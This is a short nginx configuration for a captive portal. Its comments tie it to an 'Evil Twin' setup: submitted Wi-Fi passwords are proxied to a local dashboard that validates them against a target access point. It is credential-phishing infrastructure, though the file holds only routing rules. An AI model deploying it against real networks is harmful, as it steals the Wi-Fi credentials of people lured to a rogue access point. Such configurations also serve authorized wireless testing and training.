server {
    listen 80 default_server;
    listen [::]:80 default_server;
    server_name _;

    root /opt/pinapple/portal;
    index index.html;

    # Credential submissions are handled by the dashboard: it validates Wi-Fi
    # passwords against the target AP when the Evil Twin is running.
    location = /portal/submit {
        proxy_pass http://127.0.0.1:8080/portal/submit;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    location = /portal/success {
        proxy_pass http://127.0.0.1:5000/portal/success;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }

    # Everything else is a captive-portal page.
    location / {
        try_files $uri $uri/ /index.html;
    }
}
